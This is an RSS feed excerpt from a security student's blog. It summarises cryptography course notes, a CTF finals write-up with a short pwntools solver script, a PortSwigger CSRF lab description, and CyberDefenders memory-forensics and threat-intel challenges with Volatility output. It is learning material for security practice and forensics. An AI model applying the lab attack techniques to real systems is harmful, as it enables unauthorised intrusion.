Mode of Operation e.g. ECB, CBC, CTR, GCM…(Nonsecure $\to$ Secure) 選擇甚麼樣的mode和選擇麼加密演算法是完全獨立的事情，也可以每一個block都使用完全不同的加密演算法</description></item><item><title>Cryptography Lec 2(Historical Ciphers) - Notes</title><link>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/index.html</guid><description>Cryptography Lec 2(Historical Ciphers) - Notes tags: Cryptography NTU :::spoiler 資訊安全筆記2 The Vigenere Cipher
The Vigenere Cipher是一種"polyalphabetic cipher"用一串的 Key 不斷地重複！例如 abcabcabcabc 計算方法： 例如key = d 代表a會變成d所以 w 會變成 Z
課本上的例子： :::
:::spoiler Playfair Cipher
The Playfair Cipher Encryption Algorithm: The Algorithm consists of 2 steps:
Generate the key Square(5×5): Algorithm to encrypt the plain text: The plaintext is split into pairs of two letters (digraphs). If there is an odd number of letters, a Z is added to the last letter. > For example: PlainText: "instruments" After Split: 'in' 'st' 'ru' 'me' 'nt' 'sz' :::info Note that: Pair cannot be made with same letter. Break the letter in single and add a bogus letter to the previous letter. :::</description></item><item><title>Cryptography Lec 3(Mathematical Background) - Notes</title><link>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/index.html</guid><description>Cryptography Lec 3(Mathematical Background) - Notes tags: Cryptography NTU Background :::spoiler Euclidean Algorithm(輾轉相除法) Given $a$ and $b$ with $a \ge b$ Compute $gcd(a,\ b)=gcd(b,\ a\ mod\ b)$, $gcd(a,\ 0)=a$ For example $$ Compute\ gcd(140,\ 297)\ 297=2140+17 \ 140=817+4 \ 17=44+1 \ 4=44+0 $$ Then we found the $gcd(140,\ 297)=1$
Another Example: $$ Compute\ gcd(270,\ 192)\ 270=1192+78\ 192=278+36\ 78=236+6\ 36=66+0 $$ Then we found $gcd(270,\ 192)=6$ :::
:::spoiler Extended Euclidean Algorithm 其實就只是把原本用Euclidean Algorithm算出來的$gdc(a,\ b)$，變成Linear Combination的形式而已 For example above: As we know $gcd(270,\ 192)=6$, then… $$ 6=78-362\ 36=192-278\ 78=270-1192 $$ $$\downarrow$$ $$ \begin{aligned} 6&amp;=78-(192-278)2\ &amp;=78-[192-2(270-1192)]2\ &amp;=78-[1923-2270]2\ &amp;=270-1192-1926+4270\ &amp;=2705-7192 \end{aligned} $$ Then we know the linear combination coefficient of $gcd(270,\ 192)$ is $+5$ and $-7$ :::</description></item><item><title>Cryptography Lec 4(Information Theory) - Notes</title><link>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/index.html</guid><description>Cryptography Lec 4(Information Theory) - Notes tags: Cryptography NTU Background :::spoiler Shannon’s Theorem 假設：$(P,\ C,\ K,\ e_k(\cdot),\ d_k(\cdot))$是一個cryptosystem，且$P,\ C,\ K$各自集合的數量都是一樣的 則： $$此cryptosystem具有perfect\ secrecy\ iff\ 每一把key被使用的機率都相同，i.e.{1 \over #K}，且對於每個m\in P和c\in C都有一個獨立的key\ k使得e_k(m)=c $$</description></item><item><title>Cryptography Lec 5(Symmetric Key Cryptography) - Notes</title><link>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/index.html</guid><description>Cryptography Lec 5(Symmetric Key Cryptography) - Notes tags: Cryptography NTU Background What is MDC and MAC? - 【CN007】数据安全笔记8 —— MDC 和 MAC
MDC 是一種用於驗證數據完整性的摘要信息，保證數據沒有被更改。 MAC 在 MDC 的基礎上增加了 Key 的使用。同時驗證數據完整性和發送者，保證發送者是特定人並且傳輸過程中數據沒有被更改。MAC 函數又稱為 Key 哈希函數（Keyed Hash Function） :::spoiler About RC4
第一部分 前置作業
建立一個 S-box（寫作 S） 決定密鑰 建立密鑰列表 K 第二部分 把 S 打亂
第三部分 加密
S = [0,1,2,3,4,5,6,7] K = [1,2,3,1,2,3,1,2] P = [5,3,6,7] j = 0 for i in range(8): j = ( j + S[i] + K[i] ) %8 S[i], S[j] = S[j], S[i] i, j = 0, 0 flag = 0 c_list = [] while flag &lt; len(P): i = (i + 1) % 8 j = (j +S[i]) % 8 S[i], S[j] = S[j], S[i] t = (S[i] + S[j] ) % 8 k = S[t] k = '{:03b}'.format(k) p = '{:03b}'.format(P[flag]) c = '' for n in range(3): c += str(int(k[n])^int(p[n])) c_list.append(int(c, 2)) flag += 1 print(c_list) Drawback RC4在後來被指出他所產生的密鑰並不隨機，存在統計上的偏誤，並且密文有洩漏明文資訊的可能， 因此已不再被建議使用。 :::</description></item><item><title>Cryptography Lec 6(Key Agreement Protocol) - Notes</title><link>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/index.html</guid><description>Cryptography Lec 6(Key Agreement Protocol) - Notes tags: Cryptography NTU Background About HSM(Hardware Security Module) - 什麼是硬體安全模組？
What is Wide-Mouth Frog?
The Wide Mouth Frog Protocol is a computer network verification protocol typically used on unsecured networks. It permits people communicating over a network to verify their identity to each other, it also helps in preventing replay attacks, or snooping and offers detection of any alteration and the prevention of any unwanted reading. This can be demonstrated by means of BAN (Burrows–Abadi–Needham) logic. However, to avoid active attacks, some form of message authentication or authenticated encryption must be used.</description></item><item><title>CSC 2023 決賽</title><link>https://bernie6401.github.io/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/index.html</guid><description>CSC CTF 2023 決賽 隊伍名稱: 名字好難想RRRRRRRRRRRRRRR
教學題 Q4 題目敘述 成為「admin」並取得Flag
[連線IP/連結資訊] http://192.168.100.71
[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}
Exploit 這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄 學長自述:
Q5 題目敘述 壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!
[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}
Exploit 測驗智商用的，直接pwntools就可以了
from pwn import * r = process('./Bomb.exe') r.recvuntil(b'P1ease count A(') A = r.recvuntil(b')')[:-1].decode() sign = r.recv(3).decode() B = r.recvline()[2:-2].decode() log.info(f'A({A}) {sign} B({B}) = {eval(A + sign + B)}') r.sendlineafter(b'Enter your answer: ', str(eval(A + sign + B)).encode()) r.interactive() $ python exp.py [+] Starting local process './Bomb.exe': pid 8143 [*] A(1507886) + B(7372399) = 8880285 [*] Switching to interactive mode Good job!\(^^)/ CSC{FLAG_54v3th3d4y7777777}Time's up! (っ•O•)╮ =͟͟͞͞●~* [*] Got EOF while reading in interactive Flag: CSC{FLAG_54v3th3d4y7777777}</description></item><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html</guid><description>CSRF - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
Lab: CSRF vulnerability with no defenses Description: This lab’s email change functionality is vulnerable to CSRF. Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim. Background :::spoiler CSRF 攻擊原理 [Day25]- 新手的Web系列CSRF</description></item><item><title>CyberDefender - BlackEnergy</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/index.html</guid><description>CyberDefender - BlackEnergy :::spoiler TOC [TOC] ::: Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/99
Scenario A multinational corporation has been hit by a cyber attack that has led to the theft of sensitive data. The attack was carried out using a variant of the BlackEnergy v2 malware that has never been seen before. The company’s security team has acquired a memory dump of the infected machine, and they want you, as a soc analyst, to analyze the dump to understand the attack scope and impact.</description></item><item><title>CyberDefender - CorporateSecrets (Part 1)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/index.html</guid><description>CyberDefender - CorporateSecrets (Part 1) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 2: https://hackmd.io/@SBK6401/ByFhEE8X6 Part 3: https://hackmd.io/@SBK6401/HyHp4NLQT Part 4: https://hackmd.io/@SBK6401/H1rAEV87p
:::spoiler TOC [TOC] :::
Tools: FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q1== What is the current build number on the system?
Exploit 直接把Software hive從root/Windows/System32/config/ export出來後找Microsoft/Windows NT/CurrentVersion中就有紀錄CurrentBuild number :::spoiler Result :::
:::spoiler Flag Flag: 16299 :::</description></item><item><title>CyberDefender - CorporateSecrets (Part 2)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/index.html</guid><description>CyberDefender - CorporateSecrets (Part 2) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 1: https://hackmd.io/@SBK6401/r18z7VIm6 Part 3: https://hackmd.io/@SBK6401/HyHp4NLQT Part 4: https://hackmd.io/@SBK6401/H1rAEV87p
:::spoiler TOC [TOC] :::
Tools: FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q10== What is the SID of the machine?
Exploit 直接看SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList就知道了 :::spoiler Flag Flag: S-1-5-21-2446097003-76624807-2828106174 :::
==Q11== How many web browsers are present?
Recon 直接搜索一下所有user的AppData或是program1，可以發現有五個瀏覽器(Firefox / Internet Explorer / Chrome / Edge / Tor)</description></item><item><title>CyberDefender - CorporateSecrets (Part 3)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/index.html</guid><description>CyberDefender - CorporateSecrets (Part 3) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 1: https://hackmd.io/@SBK6401/r18z7VIm6 Part 2: https://hackmd.io/@SBK6401/ByFhEE8X6 Part 4: https://hackmd.io/@SBK6401/H1rAEV87p
:::spoiler TOC [TOC] :::
Tools: FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q19== Which user installed LibreCAD on the system?
Exploit 我是直接看該檔案在哪個user的資料夾來判斷，當然這個做法有點問題
:::spoiler Flag Flag: miriam.grapes :::
==Q20== How many times “admin” logged into the system?
Recon 呈第14題
Exploit 不過我不知道為甚麼答案是21，然後我只有找到20個，看了4672也沒有紀錄(怪怪的)</description></item><item><title>CyberDefender - CorporateSecrets (Part 4)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/index.html</guid><description>CyberDefender - CorporateSecrets (Part 4) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 1: https://hackmd.io/@SBK6401/r18z7VIm6 Part 2: https://hackmd.io/@SBK6401/ByFhEE8X6 Part 3: https://hackmd.io/@SBK6401/HyHp4NLQT
:::spoiler TOC [TOC] :::
Tools: FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q28== What cloud service was a Startup item for the user admin?
Recon 直接看admin的NTUSER.DAT中的./Software/Microsoft/Windows/CurrentVersion/Run就可以了
Exploit :::spoiler Flag Flag: OneDrive :::
==Q29== Which Firefox prefetch file has the most runtimes? (Flag format is )</description></item><item><title>CyberDefender - GrabThePhisher</title><link>https://bernie6401.github.io/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/index.html</guid><description>CyberDefender - GrabThePhisher Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/95
:::spoiler TOC [TOC] :::
Scenario An attacker compromised a server and impersonated https://pancakeswap.finance/, a decentralized exchange native to BNB Chain, to host a phishing kit at https://apankewk.soup.xyz/mainpage.php. The attacker set it as an open directory with the file name “pankewk.zip”.
Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.
==Q1== Which wallet is used for asking the seed phrase?</description></item><item><title>CyberDefender - Hunter (Part 1)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/index.html</guid><description>CyberDefender - Hunter (Part 1) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/32 Part 2: https://hackmd.io/@SBK6401/HJlmeuwfT Part 3: https://hackmd.io/@SBK6401/HylP8ixQp
:::spoiler TOC [TOC] :::
Scenario The SOC team got an alert regarding some illegal port scanning activity coming from an employee’s system. The employee was not authorized to do any port scanning or any offensive hacking activity within the network. The employee claimed that he had no idea about that, and it is probably a malware acting on his behalf. The IR team managed to respond immediately and take a full forensic image of the user’s system to perform some investigations.</description></item><item><title>CyberDefender - Hunter (Part 2)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/index.html</guid><description>CyberDefender - Hunter (Part 2) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/32 Part 1: https://hackmd.io/@SBK6401/By1BpZIf6 Part 3: https://hackmd.io/@SBK6401/HylP8ixQp
:::spoiler TOC [TOC] :::
Tools PST Viewer xml parser DB Browser for SQLlite ==Q11== How many ports were scanned?
Exploit 呈上題 :::spoiler Flag Flag: 1000 :::
==Q12== What ports were found “open”?(comma-separated, ascending)
Exploit 呈上題 :::spoiler Flag Flag: 22,80,9929,31337 :::
==Q13== What was the version of the network scanner running on this computer?</description></item><item><title>CyberDefender - Hunter (Part 3)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/index.html</guid><description>CyberDefender - Hunter (Part 3) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/32 Part 1: https://hackmd.io/@SBK6401/By1BpZIf6 Part 2: https://hackmd.io/@SBK6401/HJlmeuwfT
:::spoiler TOC [TOC] :::
Tools JLECmd ==Q21== One of the installed applications is a file shredder. What is the name of the application? (two words space separated)
Recon 承接上一題，我們已經知道BCWipe就是題目要的答案，也就是類似file shredder的工具，但前面六個字還是沒有想法，看了一下外層資料夾才發現Jetico是啥東西啊，上網查才發現是提供各種data encryption/data wiping/endpoint data protection之類的公司，所以這一題的正確答案是Jetico BCWipe
:::spoiler Flag Flag: Jetico BCWipe :::
==Q22== How many prefetch files were discovered on the system?
Recon 就只是到/root/Windows/Prefetch/中數有多少的.pf檔案(善用排序)</description></item><item><title>CyberDefender - Intel101</title><link>https://bernie6401.github.io/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/index.html</guid><description>CyberDefender - Intel101 Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/38
:::spoiler TOC [TOC] :::
Scenario Open-source intelligence (OSINT) exercise to practice mining and analyzing public data to produce meaningful intel when investigating external threats as a security blue team analyst. Tools
Tool Google Lens archive.org WhoIS ==Q1== Who is the Registrar for jameskainth.com?
Recon 看whois的搜尋結果 :::spoiler Flag Flag: NameCheap :::
==Q2== You get a phone call from this number: 855-707-7328, they were previously known by another name? (No spaces between words)</description></item><item><title>CyberDefender - KrakenKeylogger</title><link>https://bernie6401.github.io/security/practice/cyberdefender/cyberdefender---krakenkeylogger/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/cyberdefender---krakenkeylogger/index.html</guid><description>CyberDefender - KrakenKeylogger :::spoiler TOC [TOC] :::
Scenario An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.</description></item><item><title>CyberDefender - L'espion</title><link>https://bernie6401.github.io/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/index.html</guid><description>CyberDefender - L’espion Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/73
:::spoiler TOC [TOC] :::
Scenario You, as a soc analyst, have been tasked by a client whose network was compromised and brought offline to investigate the incident and determine the attacker’s identity.
Incident responders and digital forensic investigators are currently on the scene and have conducted a preliminary investigation. Their findings show that the attack originated from a single user account, probably, an insider.
Investigate the incident, find the insider, and uncover the attack actions.</description></item><item><title>CyberDefender - MrRobot - POS</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/index.html</guid><description>CyberDefender - MrRobot - POS Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/88 Target 1: https://hackmd.io/@SBK6401/SkJAThwla Target 2: https://hackmd.io/@SBK6401/HJz2FPne6
:::spoiler TOC [TOC] :::
Lab - POS 起手式 $ volatility_2.6_win64_standalone.exe -f memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (D:\NTU\CTF\CyberDefenders\c69-Grrcon2015\pos01\memory.dmp) PAE type : PAE DTB : 0x3ecde260L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2015-10-09 12:52:56 UTC+0000 Image local date and time : 2015-10-09 08:52:56 -0400 重要資訊System Name:</description></item><item><title>CyberDefender - MrRobot - Target 2</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/index.html</guid><description>CyberDefender - MrRobot - Target 2 Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/88 Target 1: https://hackmd.io/@SBK6401/SkJAThwla POS: https://hackmd.io/@SBK6401/BJpJqDhlp
:::spoiler TOC [TOC] ::: Lecture Video: 2022/06/29 藍隊安全系列課程 04 Volatility - Cheat Sheet
Background Lab - Target 2 起手式 $ volatility_2.6_win64_standalone.exe -f memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (D:\NTU\CTF\CyberDefenders\c69-Grrcon2015\target2\memory.dmp) PAE type : PAE DTB : 0x3ed36260L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2015-10-09 12:53:12 UTC+0000 Image local date and time : 2015-10-09 08:53:12 -0400 重要資訊System Name: Win7SP0x86</description></item><item><title>CyberDefender - PoisonedCredentials</title><link>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/index.html</guid><description>CyberDefender - PoisonedCredentials Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/146#nav-questions
:::spoiler TOC [TOC] :::
Scenario Your organization’s security team has detected a surge in suspicious network activity. There are concerns that LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning attacks may be occurring within your network. These attacks are known for exploiting these protocols to intercept network traffic and potentially compromise user credentials. Your task is to investigate the network logs and examine captured network traffic.</description></item><item><title>CyberDefender - PsExec Hunt</title><link>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/index.html</guid><description>CyberDefender - PsExec Hunt :::spoiler [TOC] :::
Scenario Our Intrusion Detection System (IDS) has raised an alert, indicating suspicious lateral movement activity involving the use of PsExec. To effectively respond to this incident, your role as a SOC Analyst is to analyze the captured network traffic stored in a PCAP file.
==Q1== In order to effectively trace the attacker’s activities within our network, can you determine the IP address of the machine where the attacker initially gained access?</description></item><item><title>CyberDefender - RedLine</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/index.html</guid><description>CyberDefender - RedLine Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/106 :::spoiler TOC [TOC] :::
Background 這一次的instance必須要使用volatility3才能解
==Q1== What is the name of the suspicious process?
Recon 直覺會想到直接pslist看有哪一些正在執行的process，不過1提供了不一樣的想法，既然他是可疑的process，那就代表有機會操作一些malware會有的pattern例如injection之類的，所以可以先從malfind下手，看一下有哪一個process正在執行類似的操作
Exploit 方法一: 直接pslist :::spoiler Command Result $ python vol.py -f MemoryDump.mem windows.pslist PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output 4 0 System 0xad8185883180 157 - N/A False 2023-05-21 22:27:10.000000 N/A Disabled 108 4 Registry 0xad81858f2080 4 - N/A False 2023-05-21 22:26:54.000000 N/Disabled 332 4 smss.exe 0xad81860dc040 2 - N/A False 2023-05-21 22:27:10.000000 N/Disabled 452 444 csrss.exe 0xad81861cd080 12 - 0 False 2023-05-21 22:27:22.000000 N/Disabled 528 520 csrss.exe 0xad8186f1b140 14 - 1 False 2023-05-21 22:27:25.000000 N/Disabled 552 444 wininit.exe 0xad8186f2b080 1 - 0 False 2023-05-21 22:27:25.000000 N/Disabled 588 520 winlogon.exe 0xad8186f450c0 5 - 1 False 2023-05-21 22:27:25.000000 N/Disabled 676 552 services.exe 0xad8186f4d080 7 - 0 False 2023-05-21 22:27:29.000000 N/Disabled 696 552 lsass.exe 0xad8186fc6080 10 - 0 False 2023-05-21 22:27:29.000000 N/Disabled 824 676 svchost.exe 0xad818761d240 22 - 0 False 2023-05-21 22:27:32.000000 N/Disabled 852 552 fontdrvhost.ex 0xad818761b0c0 5 - 0 False 2023-05-21 22:27:33.000000 N/Disabled 860 588 fontdrvhost.ex 0xad818761f140 5 - 1 False 2023-05-21 22:27:33.000000 N/Disabled 952 676 svchost.exe 0xad81876802c0 12 - 0 False 2023-05-21 22:27:36.000000 N/Disabled 1016 588 dwm.exe 0xad81876e4340 15 - 1 False 2023-05-21 22:27:38.000000 N/A Disabled 448 676 svchost.exe 0xad8187721240 54 - 0 False 2023-05-21 22:27:41.000000 N/Disabled 752 676 svchost.exe 0xad8187758280 21 - 0 False 2023-05-21 22:27:43.000000 N/Disabled 1012 676 svchost.exe 0xad818774c080 19 - 0 False 2023-05-21 22:27:43.000000 N/Disabled 1196 676 svchost.exe 0xad81877972c0 34 - 0 False 2023-05-21 22:27:46.000000 N/Disabled 1280 4 MemCompression 0xad8187835080 62 - N/A False 2023-05-21 22:27:49.000000 N/Disabled 1376 676 svchost.exe 0xad81878020c0 15 - 0 False 2023-05-21 22:27:49.000000 N/Disabled 1448 676 svchost.exe 0xad818796c2c0 30 - 0 False 2023-05-21 22:27:52.000000 N/Disabled 1496 676 svchost.exe 0xad81879752c0 12 - 0 False 2023-05-21 22:27:52.000000 N/Disabled 1644 676 svchost.exe 0xad8187a112c0 6 - 0 False 2023-05-21 22:27:58.000000 N/Disabled 1652 676 svchost.exe 0xad8187a2d2c0 10 - 0 False 2023-05-21 22:27:58.000000 N/Disabled 1840 676 spoolsv.exe 0xad8187acb200 10 - 0 False 2023-05-21 22:28:03.000000 N/Disabled 1892 676 svchost.exe 0xad8187b34080 14 - 0 False 2023-05-21 22:28:05.000000 N/Disabled 2024 676 svchost.exe 0xad8187b65240 7 - 0 False 2023-05-21 22:28:11.000000 N/Disabled 2076 676 svchost.exe 0xad8187b94080 10 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2144 676 vmtoolsd.exe 0xad81896ab080 11 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2152 676 vm3dservice.ex 0xad81896ae240 2 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2200 676 VGAuthService. 0xad81896b3300 2 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2404 2152 vm3dservice.ex 0xad8186619200 2 - 1 False 2023-05-21 22:28:32.000000 N/Disabled 3028 676 dllhost.exe 0xad8185907080 12 - 0 False 2023-05-21 22:29:20.000000 N/Disabled 832 676 msdtc.exe 0xad8185861280 9 - 0 False 2023-05-21 22:29:25.000000 N/Disabled 1232 676 svchost.exe 0xad8186f4a2c0 7 - 0 False 2023-05-21 22:29:39.000000 N/Disabled 1392 448 sihost.exe 0xad8189e94280 11 - 1 False 2023-05-21 22:30:08.000000 N/Disabled 1064 676 svchost.exe 0xad8189d7c2c0 15 - 1 False 2023-05-21 22:30:09.000000 N/Disabled 1600 448 taskhostw.exe 0xad8189d07300 10 - 1 False 2023-05-21 22:30:09.000000 N/Disabled 3204 752 ctfmon.exe 0xad8189c8b280 12 - 1 False 2023-05-21 22:30:11.000000 N/Disabled 3556 588 userinit.exe 0xad818c02f340 0 - 1 False 2023-05-21 22:30:28.000000 2023-05-21 22:30:43.000000 Disabled 3580 3556 explorer.exe 0xad818c047340 76 - 1 False 2023-05-21 22:30:28.000000 N/Disabled 3944 824 WmiPrvSE.exe 0xad818c054080 13 - 0 False 2023-05-21 22:30:44.000000 N/Disabled 3004 676 svchost.exe 0xad818c4212c0 7 - 0 False 2023-05-21 22:30:55.000000 N/Disabled 1116 676 svchost.exe 0xad818c426080 6 - 1 False 2023-05-21 22:31:00.000000 N/Disabled 3160 824 StartMenuExper 0xad818cad3240 14 - 1 False 2023-05-21 22:31:21.000000 N/Disabled 4116 824 RuntimeBroker. 0xad818cd93300 3 - 1 False 2023-05-21 22:31:24.000000 N/Disabled 4228 676 SearchIndexer. 